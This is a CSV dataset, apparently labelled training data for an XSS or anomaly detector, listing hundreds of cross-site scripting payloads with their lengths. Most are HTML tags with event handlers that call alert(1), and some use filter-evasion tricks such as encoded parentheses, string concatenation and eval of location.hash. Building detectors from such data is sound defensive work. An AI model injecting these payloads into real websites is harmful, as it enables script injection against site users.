payload,length,attack_type,label
<body onpageshow=alert(1)>,26,xss,anom
<body onfocus=alert(1)>,23,xss,anom
<body onhashchange=alert(1)><a href=#x>click this!#x,52,xss,anom
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,65,xss,anom
<body onscroll=alert(1)><br><br><br><br>,40,xss,anom
<br><br><br><br><br><br><br><br><br><br>,40,xss,anom
<br><br><br><br><br><br><br><br><br><br>,40,xss,anom
<br><br><br><br><br><br><x id=x>#x,34,xss,anom
<body onresize=alert(1)>press F12!,34,xss,anom
<body onhelp=alert(1)>press F1! (MSIE),38,xss,anom
<marquee onstart=alert(1)>,26,xss,anom
<marquee loop=1 width=0 onfinish=alert(1)>,42,xss,anom
<audio src onloadstart=alert(1)>,32,xss,anom
<video onloadstart=alert(1)><source>,36,xss,anom
<input autofocus onblur=alert(1)>,33,xss,anom
<keygen autofocus onfocus=alert(1)>,35,xss,anom
<form onsubmit=alert(1)><input type=submit>,43,xss,anom
<select onchange=alert(1)><option>1<option>2,44,xss,anom
<menu id=x contextmenu=x onshow=alert(1)>right click me!,56,xss,anom
alert`1`,8,xss,anom
alert&lpar;1&rpar;,18,xss,anom
alert&#x28;1&#x29,17,xss,anom
alert&#40;1&#41,15,xss,anom
(alert)(1),10,xss,anom
"a=alert,a(1)",12,xss,anom
[1].find(alert),15,xss,anom
"top[""al""+""ert""](1)",18,xss,anom
top[/al/.source+/ert/.source](1),32,xss,anom
al\u0065rt(1),13,xss,anom
top['al\145rt'](1),18,xss,anom
top['al\x65rt'](1),18,xss,anom
top[8680439..toString(30)](1),29,xss,anom
navigator.vibrate(500),22,xss,anom
eval(URL.slice(-8))>#alert(1),29,xss,anom
eval(location.hash.slice(1)>#alert(1),37,xss,anom
innerHTML=location.hash>#<script>alert(1)</script>,50,xss,anom
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",46,xss,anom
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",49,xss,anom
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",51,xss,anom
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",51,xss,anom
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",51,xss,anom
<a id=x tabindex=1 onactivate=alert(1)></a>,43,xss,anom
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,49,xss,anom
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,68,xss,anom
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,67,xss,anom
<a id=x tabindex=1 onfocus=alert(1)></a>,40,xss,anom
<a id=x tabindex=1 onfocusin=alert(1)></a>,42,xss,anom
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",51,xss,anom
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",50,xss,anom
"<a onbeforepaste=""alert(1)"" contenteditable>test</a>",52,xss,anom
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,56,xss,anom
"<a onclick=""alert(1)"">test</a>",30,xss,anom
"<a oncontextmenu=""alert(1)"">test</a>",36,xss,anom
"<a oncopy=""alert(1)"" contenteditable>test</a>",45,xss,anom
"<a oncut=""alert(1)"" contenteditable>test</a>",44,xss,anom
"<a ondblclick=""alert(1)"">test</a>",33,xss,anom
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,60,xss,anom
"<a onkeydown=""alert(1)"" contenteditable>test</a>",48,xss,anom
"<a onkeypress=""alert(1)"" contenteditable>test</a>",49,xss,anom
"<a onkeyup=""alert(1)"" contenteditable>test</a>",46,xss,anom
"<a onmousedown=""alert(1)"">test</a>",34,xss,anom
"<a onmouseenter=""alert(1)"">test</a>",35,xss,anom
"<a onmouseleave=""alert(1)"">test</a>",35,xss,anom
"<a onmousemove=""alert(1)"">test</a>",34,xss,anom
"<a onmouseout=""alert(1)"">test</a>",33,xss,anom
"<a onmouseover=""alert(1)"">test</a>",34,xss,anom
"<a onmouseup=""alert(1)"">test</a>",32,xss,anom
"<a onpaste=""alert(1)"" contenteditable>test</a>",46,xss,anom
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",52,xss,anom
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",55,xss,anom
"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",57,xss,anom
"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>",57,xss,anom
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",57,xss,anom
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,49,xss,anom
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,55,xss,anom
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,74,xss,anom
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,73,xss,anom
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,46,xss,anom
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,48,xss,anom
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",57,xss,anom
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",56,xss,anom
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",58,xss,anom
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,62,xss,anom
"<abbr onclick=""alert(1)"">test</abbr>",36,xss,anom
"<abbr oncontextmenu=""alert(1)"">test</abbr>",42,xss,anom
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",51,xss,anom
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",50,xss,anom
"<abbr ondblclick=""alert(1)"">test</abbr>",39,xss,anom
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>,66,xss,anom
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",54,xss,anom
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",55,xss,anom
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",52,xss,anom
"<abbr onmousedown=""alert(1)"">test</abbr>",40,xss,anom
"<abbr onmouseenter=""alert(1)"">test</abbr>",41,xss,anom
"<abbr onmouseleave=""alert(1)"">test</abbr>",41,xss,anom
"<abbr onmousemove=""alert(1)"">test</abbr>",40,xss,anom
"<abbr onmouseout=""alert(1)"">test</abbr>",39,xss,anom
"<abbr onmouseover=""alert(1)"">test</abbr>",40,xss,anom
"<abbr onmouseup=""alert(1)"">test</abbr>",38,xss,anom
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",52,xss,anom
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",58,xss,anom
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",61,xss,anom
"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",63,xss,anom
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",63,xss,anom
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",63,xss,anom
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,55,xss,anom
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,61,xss,anom
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,80,xss,anom
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,79,xss,anom
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,52,xss,anom
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,54,xss,anom
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",63,xss,anom
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",62,xss,anom
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",64,xss,anom
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,68,xss,anom
"<acronym onclick=""alert(1)"">test</acronym>",42,xss,anom
"<acronym oncontextmenu=""alert(1)"">test</acronym>",48,xss,anom
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",57,xss,anom
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",56,xss,anom
"<acronym ondblclick=""alert(1)"">test</acronym>",45,xss,anom
<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,72,xss,anom
"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>",60,xss,anom
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",61,xss,anom
"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>",58,xss,anom
"<acronym onmousedown=""alert(1)"">test</acronym>",46,xss,anom
"<acronym onmouseenter=""alert(1)"">test</acronym>",47,xss,anom
"<acronym onmouseleave=""alert(1)"">test</acronym>",47,xss,anom
"<acronym onmousemove=""alert(1)"">test</acronym>",46,xss,anom
"<acronym onmouseout=""alert(1)"">test</acronym>",45,xss,anom
"<acronym onmouseover=""alert(1)"">test</acronym>",46,xss,anom
"<acronym onmouseup=""alert(1)"">test</acronym>",44,xss,anom
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",58,xss,anom
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",58,xss,anom
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",61,xss,anom
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",63,xss,anom
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",63,xss,anom
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",63,xss,anom
<address id=x tabindex=1 onactivate=alert(1)></address>,55,xss,anom
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,61,xss,anom
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,80,xss,anom
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,79,xss,anom
<address id=x tabindex=1 onfocus=alert(1)></address>,52,xss,anom
<address id=x tabindex=1 onfocusin=alert(1)></address>,54,xss,anom
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",63,xss,anom
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",62,xss,anom
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",64,xss,anom
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,68,xss,anom
"<address onclick=""alert(1)"">test</address>",42,xss,anom
"<address oncontextmenu=""alert(1)"">test</address>",48,xss,anom
"<address oncopy=""alert(1)"" contenteditable>test</address>",57,xss,anom
"<address oncut=""alert(1)"" contenteditable>test</address>",56,xss,anom
"<address ondblclick=""alert(1)"">test</address>",45,xss,anom
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>,72,xss,anom
"<address onkeydown=""alert(1)"" contenteditable>test</address>",60,xss,anom
"<address onkeypress=""alert(1)"" contenteditable>test</address>",61,xss,anom
"<address onkeyup=""alert(1)"" contenteditable>test</address>",58,xss,anom
"<address onmousedown=""alert(1)"">test</address>",46,xss,anom
"<address onmouseenter=""alert(1)"">test</address>",47,xss,anom
"<address onmouseleave=""alert(1)"">test</address>",47,xss,anom
"<address onmousemove=""alert(1)"">test</address>",46,xss,anom
"<address onmouseout=""alert(1)"">test</address>",45,xss,anom
"<address onmouseover=""alert(1)"">test</address>",46,xss,anom
"<address onmouseup=""alert(1)"">test</address>",44,xss,anom
"<address onpaste=""alert(1)"" contenteditable>test</address>",58,xss,anom
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",56,xss,anom
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",59,xss,anom
"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>",61,xss,anom
"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",61,xss,anom
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",61,xss,anom
<applet id=x tabindex=1 onactivate=alert(1)></applet>,53,xss,anom
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,59,xss,anom
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,78,xss,anom
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,77,xss,anom
<applet id=x tabindex=1 onfocus=alert(1)></applet>,50,xss,anom
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,52,xss,anom
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",61,xss,anom
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",60,xss,anom
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",62,xss,anom
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,66,xss,anom
"<applet onclick=""alert(1)"">test</applet>",40,xss,anom
"<applet oncontextmenu=""alert(1)"">test</applet>",46,xss,anom
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",55,xss,anom
"<applet oncut=""alert(1)"" contenteditable>test</applet>",54,xss,anom
"<applet ondblclick=""alert(1)"">test</applet>",43,xss,anom
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,70,xss,anom
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",58,xss,anom
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",59,xss,anom
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",56,xss,anom
"<applet onmousedown=""alert(1)"">test</applet>",44,xss,anom
"<applet onmouseenter=""alert(1)"">test</applet>",45,xss,anom
"<applet onmouseleave=""alert(1)"">test</applet>",45,xss,anom
"<applet onmousemove=""alert(1)"">test</applet>",44,xss,anom
"<applet onmouseout=""alert(1)"">test</applet>",43,xss,anom
"<applet onmouseover=""alert(1)"">test</applet>",44,xss,anom
"<applet onmouseup=""alert(1)"">test</applet>",42,xss,anom
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",56,xss,anom
<applet onreadystatechange=alert(1)></applet>,45,xss,anom
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",52,xss,anom
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",55,xss,anom
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",57,xss,anom
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",57,xss,anom
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",57,xss,anom
<area id=x tabindex=1 onactivate=alert(1)></area>,49,xss,anom
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,55,xss,anom
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,74,xss,anom
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,73,xss,anom
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",57,xss,anom
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",56,xss,anom
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",58,xss,anom
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,62,xss,anom
"<area onclick=""alert(1)"">test</area>",36,xss,anom
"<area oncontextmenu=""alert(1)"">test</area>",42,xss,anom
"<area oncopy=""alert(1)"" contenteditable>test</area>",51,xss,anom
"<area oncut=""alert(1)"" contenteditable>test</area>",50,xss,anom
"<area ondblclick=""alert(1)"">test</area>",39,xss,anom
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,66,xss,anom
"<area onkeydown=""alert(1)"" contenteditable>test</area>",54,xss,anom
"<area onkeypress=""alert(1)"" contenteditable>test</area>",55,xss,anom
"<area onkeyup=""alert(1)"" contenteditable>test</area>",52,xss,anom
"<area onmousedown=""alert(1)"">test</area>",40,xss,anom
"<area onmouseenter=""alert(1)"">test</area>",41,xss,anom
"<area onmouseleave=""alert(1)"">test</area>",41,xss,anom
"<area onmousemove=""alert(1)"">test</area>",40,xss,anom
"<area onmouseout=""alert(1)"">test</area>",39,xss,anom
"<area onmouseover=""alert(1)"">test</area>",40,xss,anom
"<area onmouseup=""alert(1)"">test</area>",38,xss,anom
"<area onpaste=""alert(1)"" contenteditable>test</area>",52,xss,anom
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",58,xss,anom
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",61,xss,anom
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",63,xss,anom
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",63,xss,anom
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",63,xss,anom
<article id=x tabindex=1 onactivate=alert(1)></article>,55,xss,anom
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,61,xss,anom
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,80,xss,anom
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,79,xss,anom
<article id=x tabindex=1 onfocus=alert(1)></article>,52,xss,anom
<article id=x tabindex=1 onfocusin=alert(1)></article>,54,xss,anom
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",63,xss,anom
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",62,xss,anom
"<article onbeforepaste=""alert(1)"" contenteditable>test</article>",64,xss,anom
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>,68,xss,anom
"<article onclick=""alert(1)"">test</article>",42,xss,anom
"<article oncontextmenu=""alert(1)"">test</article>",48,xss,anom
"<article oncopy=""alert(1)"" contenteditable>test</article>",57,xss,anom
"<article oncut=""alert(1)"" contenteditable>test</article>",56,xss,anom
"<article ondblclick=""alert(1)"">test</article>",45,xss,anom
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,72,xss,anom
"<article onkeydown=""alert(1)"" contenteditable>test</article>",60,xss,anom
"<article onkeypress=""alert(1)"" contenteditable>test</article>",61,xss,anom
"<article onkeyup=""alert(1)"" contenteditable>test</article>",58,xss,anom
"<article onmousedown=""alert(1)"">test</article>",46,xss,anom
"<article onmouseenter=""alert(1)"">test</article>",47,xss,anom
"<article onmouseleave=""alert(1)"">test</article>",47,xss,anom
"<article onmousemove=""alert(1)"">test</article>",46,xss,anom
"<article onmouseout=""alert(1)"">test</article>",45,xss,anom
"<article onmouseover=""alert(1)"">test</article>",46,xss,anom
"<article onmouseup=""alert(1)"">test</article>",44,xss,anom
"<article onpaste=""alert(1)"" contenteditable>test</article>",58,xss,anom
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",54,xss,anom
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>",57,xss,anom
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",59,xss,anom
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",59,xss,anom
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",59,xss,anom
<aside id=x tabindex=1 onactivate=alert(1)></aside>,51,xss,anom
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,57,xss,anom
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,76,xss,anom
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,75,xss,anom
<aside id=x tabindex=1 onfocus=alert(1)></aside>,48,xss,anom
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,50,xss,anom
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",59,xss,anom
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",58,xss,anom
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",60,xss,anom
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,64,xss,anom
"<aside onclick=""alert(1)"">test</aside>",38,xss,anom
"<aside oncontextmenu=""alert(1)"">test</aside>",44,xss,anom
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",53,xss,anom
"<aside oncut=""alert(1)"" contenteditable>test</aside>",52,xss,anom
"<aside ondblclick=""alert(1)"">test</aside>",41,xss,anom
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,68,xss,anom
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",56,xss,anom
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",57,xss,anom
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",54,xss,anom
"<aside onmousedown=""alert(1)"">test</aside>",42,xss,anom
"<aside onmouseenter=""alert(1)"">test</aside>",43,xss,anom
"<aside onmouseleave=""alert(1)"">test</aside>",43,xss,anom
"<aside onmousemove=""alert(1)"">test</aside>",42,xss,anom
"<aside onmouseout=""alert(1)"">test</aside>",41,xss,anom
"<aside onmouseover=""alert(1)"">test</aside>",42,xss,anom
"<aside onmouseup=""alert(1)"">test</aside>",40,xss,anom
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",54,xss,anom
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",96,xss,anom
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",97,xss,anom
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",98,xss,anom
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",103,xss,anom
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",97,xss,anom
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",86,xss,anom
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",89,xss,anom
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",96,xss,anom
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",101,xss,anom
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",54,xss,anom
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",57,xss,anom
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",59,xss,anom
"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",59,xss,anom
"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>",59,xss,anom
